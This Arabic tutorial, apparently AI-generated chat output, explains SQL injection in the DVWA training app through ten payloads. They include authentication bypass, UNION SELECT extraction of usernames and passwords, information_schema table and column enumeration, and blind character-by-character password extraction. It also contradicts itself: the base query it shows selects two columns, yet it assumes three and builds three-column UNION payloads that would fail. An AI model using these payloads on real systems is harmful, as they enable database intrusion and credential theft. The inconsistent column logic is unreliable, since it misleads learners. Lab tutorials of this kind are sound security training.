
# 🔐 شرح SQL Injection باستخدام DVWA

هذا الدليل يشرح كيف تعمل ثغرة SQL Injection داخل تطبيق DVWA، وبالتحديد كيف تؤدي الحمولة (`OR '1'='1`) إلى إرجاع جميع المستخدمين من قاعدة البيانات.

---

## 📌 الشكل الطبيعي للاستعلام في DVWA (مستوى Low)

الاستعلام داخل التطبيق غالبًا ما يكون على الشكل التالي:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id'
```

إذا كتبنا في الرابط:

```
?id=1
```

سيصبح الاستعلام:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'
```

🟢 هذا استعلام سليم يرجع بيانات المستخدم برقم 1 فقط.

---

## ⚠️ عند استخدام حمولة SQL Injection:

```
?id=1' OR '1'='1
```

يصبح شكل الاستعلام كالتالي:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1'
```

### ✅ التحليل:

- `user_id = '1'` قد تكون خاطئة.
- `OR '1'='1'` دائمًا تعطي `TRUE`.
- بالتالي، الشرط ككل دائمًا **صحيح**.
- والنتيجة: **ترجع قاعدة البيانات جميع الصفوف** من جدول المستخدمين.

---

## 💥 النتيجة

تُرجع قاعدة البيانات كل المستخدمين لأن شرط `WHERE` لم يعد يفلتر النتائج بشكل صحيح.

> "هات لي المستخدم برقم 1، أو أي صف لأن `'1'='1'` صحيحة دائمًا."

---

## 📊 تمثيل توضيحي

| user_id | نتيجة الشرط (`user_id='1' OR '1'='1'`) | يتم الإرجاع؟ |
|---------|----------------------------------------|---------------|
| 1       | TRUE OR TRUE                            | ✅ نعم        |
| 2       | FALSE OR TRUE                           | ✅ نعم        |
| 3       | FALSE OR TRUE                           | ✅ نعم        |
| ...     | ...                                     | ✅ نعم        |

---

## 🎯 الهدف من استخدام هذه الحمولة

- التحقق مما إذا كان التطبيق **معرضًا لـ SQL Injection**.
- إظهار أن التطبيق لا يُفلتر مدخلات المستخدم.
- التمكن من **تعديل الاستعلام** الأصلي وتنفيذه كما نريد.

---

## 📚 ملاحظات إضافية

- هذه التقنية تنجح فقط في مستوى الحماية **Low** داخل DVWA.
- في المستويات الأعلى مثل **Medium** أو **High**، ستحتاج إلى تقنيات أكثر تقدمًا مثل **Blind SQLi**.

---

> 💡 للتجريب العملي، غيّر مستوى DVWA إلى Low وابدأ بإدخال الحمولات من المتصفح ولاحظ النتيجة.

---

# 🚀 شرح حمولات SQL Injection إضافية في DVWA

## 🔹 حمولة 2: تعليق الاستعلام

### الحمولة:
```
?id=1' --
```

### النتيجة:

يصبح الاستعلام كالتالي:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' --'
```

### ✅ التحليل:

- `--` هو **تعليق في SQL**.
- كل ما يأتي بعد `--` يتم تجاهله.
- هذا يسمح لنا **بإغلاق الاقتباس المفرد** وتعليق أي جزء باقي من الاستعلام.
- إذا كان هناك كود SQL بعد `user_id = '$id'` (مثل اقتباس آخر أو شروط إضافية)، فلن يتم تنفيذه.

---

## 🔹 حمولة 3: تحديد عدد الأعمدة باستخدام ORDER BY

### الحمولة:
```
?id=1' ORDER BY 3 --
```

### النتيجة:

الاستعلام يصبح:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' ORDER BY 3 --'
```

### ✅ التحليل:

- `ORDER BY 3` تطلب ترتيب النتائج حسب العمود الثالث.
- إذا كان عدد الأعمدة في الاستعلام أقل من 3، **ستظهر رسالة خطأ**.
- هذا يستخدم لاكتشاف **عدد الأعمدة** الفعلي في الاستعلام (مفيد في هجوم UNION).

---

## 🔹 حمولة 4: استخدام UNION SELECT لاستخراج بيانات من جدول آخر

### الحمولة:
```
?id=1' UNION SELECT 1, username, password FROM users --
```

### النتيجة:

الاستعلام يصبح:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'
UNION SELECT 1, username, password FROM users --'
```

### ✅ التحليل:

- `UNION` يسمح لنا بجلب نتائج من استعلام آخر، بشرط أن **يكون عدد الأعمدة مساويًا**.
- هنا نفترض أن عدد الأعمدة في الاستعلام الأصلي هو 3.
- `1` هو مجرد placeholder للعمود الأول، ونعرض بعدها `username` و`password` من جدول `users`.
- النتيجة: تعرض DVWA جدول يحتوي أسماء المستخدمين وكلمات السر.

---

## 🔹 حمولة 5: Blind SQL Injection (استعلام أعمى)

### الحمولة:
```
?id=1' AND 1=1 --
```
و
```
?id=1' AND 1=2 --
```

### ✅ التحليل:

- في الأولى: الشرط صحيح → تظهر النتائج.
- في الثانية: الشرط خاطئ → لا تظهر نتائج.
- إذا لاحظت اختلافًا في الرد، فالتطبيق قد يكون معرضًا لـ **Blind SQLi**.

---

## 🔹 حمولة 6: استخراج كلمة مرور باستخدام Blind SQLi حرفًا حرفًا

### مثال:
```
?id=1' AND SUBSTRING((SELECT password FROM users WHERE user_id=1), 1, 1) = 'a' --
```

### ✅ التحليل:

- يتم التحقق مما إذا كان **أول حرف** من كلمة مرور المستخدم برقم 1 هو `'a'`.
- إذا ظهر رد مختلف (أو لم يظهر)، نعرف هل التحقق نجح أم لا.
- يمكننا استخدام سكربت لتكرار المحاولة واستخراج كلمة المرور بالكامل.

---

> 🛠️ هذه الحمولات تفترض أن الحماية في DVWA على مستوى **Low أو Medium**. في مستوى **High**، سيكون هناك فلترة أو استخدام Prepared Statements تمنع التنفيذ.




أكيد! نكمل الآن شرح الحمولات الإضافية الخاصة بـ **SQL Injection في DVWA** بشكل مرتب ومفصل، تمامًا كما فعلنا سابقًا.

---

## 🔹 حمولة 7: استخدام دوال للكشف عن المعلومات (version, database, user)

### الحمولة:

```
?id=1' UNION SELECT 1, @@version, null --
```

### النتيجة:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'
UNION SELECT 1, @@version, null --'
```

### ✅ التحليل:

* `@@version` تُرجع إصدار محرك قاعدة البيانات (مثلاً: MySQL 5.7.31).
* `null` هو مجرد placeholder ليطابق عدد الأعمدة مع الاستعلام الأصلي.
* تستخدم هذه التقنية لاكتشاف **معلومات حساسة** عن النظام.

🔹 أمثلة أخرى:

* `@@user` → يعرض اسم المستخدم المتصل بقاعدة البيانات.
* `database()` → يعرض اسم قاعدة البيانات الحالية.

---

## 🔹 حمولة 8: استخراج الجداول من قاعدة البيانات (مع معلومات سكيمات)

### الحمولة:

```sql
?id=1' UNION SELECT 1, table_name, null FROM information_schema.tables WHERE table_schema = database() --
```

### ✅ التحليل:

* `information_schema.tables` يحتوي على أسماء كل الجداول في قاعدة البيانات.
* `table_schema = database()` يحدد أن الجداول المطلوبة من قاعدة البيانات الحالية فقط.
* يتم عرض أسماء الجداول، مما يساعد في **مرحلة الاستكشاف (Enumeration)**.

---

## 🔹 حمولة 9: استخراج أسماء الأعمدة من جدول معين

### الحمولة:

```sql
?id=1' UNION SELECT 1, column_name, null FROM information_schema.columns WHERE table_name = 'users' --
```

### ✅ التحليل:

* الهدف هنا هو **الحصول على أسماء الأعمدة** داخل جدول معين.
* بعد اكتشاف اسم الجدول (مثلاً `users`)، نستخدم هذه الحمولة لمعرفة أسماء الأعمدة (مثل `username`, `password`).

---

## 🔹 حمولة 10: استخراج بيانات مستخدم معين حرفًا حرفًا (Blind SQLi متقدم)

### مثال:

```sql
?id=1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE user_id=1), 1, 1)) = 97 --
```

### ✅ التحليل:

* هذا التحقق يستخدم دالة `ASCII()` للتحقق من الحرف الأول.
* `97` = الحرف `'a'`.
* بهذه الطريقة، يمكن استخراج كل حرف من كلمة السر باستخدام سكربتات أو أدوات مثل `sqlmap`.

---

## 🎯 ملخص عملي

| نوع الحمولة                  | الهدف                           |
| ---------------------------- | ------------------------------- |
| `OR '1'='1`                  | تخطي التحقق وإظهار الكل         |
| `--`                         | تعليق الاستعلام                 |
| `ORDER BY`                   | معرفة عدد الأعمدة               |
| `UNION SELECT`               | دمج بيانات من استعلام آخر       |
| `@@version` / `database()`   | اكتشاف معلومات النظام           |
| `information_schema.tables`  | معرفة أسماء الجداول             |
| `information_schema.columns` | معرفة أسماء الأعمدة             |
| `SUBSTRING + ASCII`          | استخراج بيانات حساسة حرفًا بحرف |

---

إذا أحببت، يمكنني بعد الانتهاء من كل شيء توليد **رسم توضيحي** يربط بين الخطوات المختلفة لعملية SQL Injection في DVWA. هل ترغب بذلك؟

